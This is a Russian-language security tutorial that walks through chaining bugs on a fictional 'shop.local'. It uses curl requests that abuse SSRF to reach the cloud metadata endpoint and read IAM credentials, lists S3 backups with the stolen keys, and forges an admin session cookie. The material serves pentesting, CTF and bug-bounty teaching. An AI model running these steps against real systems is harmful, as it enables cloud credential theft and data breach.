## Вопрос, с которого всё начинается

У тебя есть находка: «открытый редирект» или «SSRF без вывода». Сама по себе — мелочь, за неё даже не всегда платят. Но что если из нескольких мелочей собрать **критичный** импакт?

Реальная атака почти никогда не состоит из одной уязвимости. Она состоит из **цепочки**: одна находка даёт доступ, вторая расширяет, третья приводит к цели. Сегодня мы соберём такую цепочку руками.

## Наш пример

`shop.local` — интернет-магазин. У него есть функция «поделиться ссылкой на товар», которая ходит по URL:

```http
GET /api/preview?url=https://cdn.local/img.png HTTP/1.1
Host: shop.local
```

Формально это **SSRF** — Server-Side Request Forgery, когда сервер по нашей просьбе делает запрос по указанному нами адресу. Если вывод не отражается, кажется, что это бесполезно. Смотрим, что происходит.

## Шаг 1: SSRF — есть ли вывод и куда можно ходить?

Проверим, ограничен ли адрес. Запросим локальный сервис:

```bash
$ curl -s 'https://shop.local/api/preview?url=http://127.0.0.1:80/'
{"status":200,"size":1234}
```

Ответ содержит `status` и `size` — значит, вывод **частичный**, но адрес не ограничен. Теперь попробуем облачные метаданные (специальный адрес, по которому облачный сервис рассказывает о себе):

```bash
$ curl -s 'https://shop.local/api/preview?url=http://169.254.169.254/latest/meta-data/'
{"status":200,"size":42}
```

`200` и `size:42` — значит, метаданные доступны. Если бы вывод отражался целиком, мы бы уже читали их. А так — у нас есть **слепой SSRF** с измеримым размером.

## Шаг 2: слепой SSRF → чтение через размер

Раз мы видим `size`, можно читать данные **по одному символу**, подбирая URL так, чтобы ответ менял размер. Но проще — поискать эндпоинт, который отражает содержимое целиком. Часто рядом есть `/api/fetch`:

```bash
$ curl -s 'https://shop.local/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
```

Он возвращает имя роли. Дальше — креды:

```bash
$ curl -s 'https://shop.local/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-role'
{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
```

Вот и первая цель: временные облачные ключи. Из «бесполезного SSRF» выросли креды.

## Шаг 3: креды → доступ к хранилищу

С ключами идём в облако (в рамках авторизованного теста — на своей тестовой учётке):

```bash
$ AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... aws s3 ls s3://shop-backups/
2026-01-01 12:00:00  1048576  db.sql.gz
```

В бэкапе — дамп базы с хэшами паролей. Это вторая ступень: от веб-уязвимости к данным всей компании.

## Шаг 4: данные → админ

Из дампа достаём хэш администратора, но не ломаем его — вместо этого ищем в бэкапе **конфиг** с секретом подписи сессии. С ним можно подделать cookie администратора (см. `web-auth-jwt-idor`):

```bash
$ curl -s https://shop.local/admin -b 'session=FORGED_ADMIN'
{"panel":"admin","users":1024}
```

Цепочка замкнулась: `preview` → SSRF → метаданные → креды → S3 → конфиг → админ. Ни одна отдельная находка не была «критичной», но вместе — полный компромисс.

## Шаг 5: как строить цепочки системно

Цепочки не собираются случайно — их **проектируют**. Держи в голове модель «что мне даёт эта находка»:

- **Доступ к запросу от сервера** (SSRF, XXE, редирект) → внутренние сервисы, метаданные.
- **Утечка файла** (LFI, бэкап, .git) → конфиги, секреты, исходники.
- **Подмена данных** (HPP, mass assignment, IDOR) → права, чужие объекты.
- **Выполнение кода** (upload, deser, SSTI) → полный контроль.

Каждую находку записывай в столбик и спрашивай: «а что она открывает дальше?». Ответ на этот вопрос и есть следующее звено.

## Полный прогон от начала до конца

Находим `/api/preview`, пробуем `127.0.0.1` — работает. Пробуем метаданные — `200`. Ищем отражающий `/api/fetch` — читаем роль. Достаём креды. Идём в S3, находим бэкап. В бэкапе — конфиг с секретом. Подделываем сессию админа. Семь шагов, каждая ступень — отдельная «средняя» уязвимость. В отчёте важно показать всю цепочку целиком, иначе импакт неочевиден.

## Что делает звено сильным

Не все находки одинаково полезны в цепочке. Сильное звено — то, которое даёт **новый класс доступа**: чтение внутреннего сервиса, подмену данных, исполнение кода. Слабое — то, что даёт только информацию о себе (баннер, версия). Поэтому, собирая цепочку, приоритезируй: SSRF/XXE/LFI дают «чтение», IDOR/mass assignment — «подмену», upload/deser/SSTI — «исполнение». Если у тебя есть звено «чтение» и звено «исполнение», между ними почти всегда найдётся мостик (секрет, креды, конфиг). Ещё один принцип: цепочка должна быть **воспроизводимой** — начиная с первого запроса и кончая последним, без «магии» посередине. Если какое-то звено нестабильно, пометь его как «вероятное» и приложи доказательства по остальным.

## Как это выглядит в отчёте

Цепочку в отчёте описывают как рассказ, а не как список. Начни с цели («получить доступ к данным всех пользователей»), затем веди читателя по звеньям: запрос → вывод → следующий запрос → вывод. Для каждого звена — скриншот или сырой запрос/ответ. В конце покажи **импакт**: «мы прочитали дамп базы, подделали сессию администратора и вошли в панель». Такой формат принимают и в bug bounty, и в пентест-отчёте, потому что он демонстрирует не набор багов, а реальный путь атакующего. Если какое-то звено не удалось довести до конца (например, не было облака), честно пометь его как «предполагаемое» и покажи, почему оно сработало бы.

## Инструменты

Цепочки собираются не одним инструментом, а **мышлением** плюс обычным набором: Burp (все запросы и выводы), `ffuf`/`gobuster` (найти эндпоинты), `nuclei` (быстрые известные баги), облачные CLI (`aws`/`gcloud`) для работы с найденными кредами, Impacket — если цепочка уходит в AD. Полезно вести «граф находок»: узел — уязвимость, ребро — «что она даёт». Тогда следующее звено видно сразу, а не находится случайно.

## Частые вопросы

**«С чего начинать цепочку?»** С самой «сильной» находки — той, что даёт новый класс доступа (чтение, подмена, исполнение). От неё строишь мостики к следующему звену.

**«Что если цепочку не удаётся довести до конца?»** Оформи её как «вероятную»: покажи пройденные звенья и объясни, почему следующее сработало бы. Часто даже частичная цепочка имеет высокий импакт.

## Что мы теперь знаем

- Реальный импакт даёт композиция, а не одиночная находка.
- SSRF даже без вывода может стать чтением через размер или через соседний эндпоинт.
- Креды из метаданных открывают хранилища и конфиги.
- Секрет подписи → подделка сессии → админ.
- Цепочку проектируют: «что мне даёт эта находка?».
- В отчёте цепочка описывается как рассказ с импактом в конце.
- Каждое звено должно быть воспроизводимым, иначе пометь его «вероятным».

## На что смотреть дальше

- Веди список находок и для каждой спрашивай «что дальше».
- Не отбрасывай «мелкие» баги — они часто звено цепочки.
- Связывай веб-находки с облаком, внутренними сервисами и данными.
- В отчёте показывай цепочку целиком — импакт и есть сумма звеньев.

## Куда дальше

Дальше мы возьмём защиту, которая мешает цепочкам — WAF и фильтры — и разберём, как обходить её, чтобы payload вообще дошёл до уязвимости. А пока главное: атака — это сумма звеньев, а не одно звено.

## Где пригодится

- **CTF (Web):** многошаговые задачи.
- **Bug bounty:** цепочки — максимальные выплаты.
- **Red team:** путь до домена/облака.
- **Работа (AppSec):** оценка реального риска комбинаций.
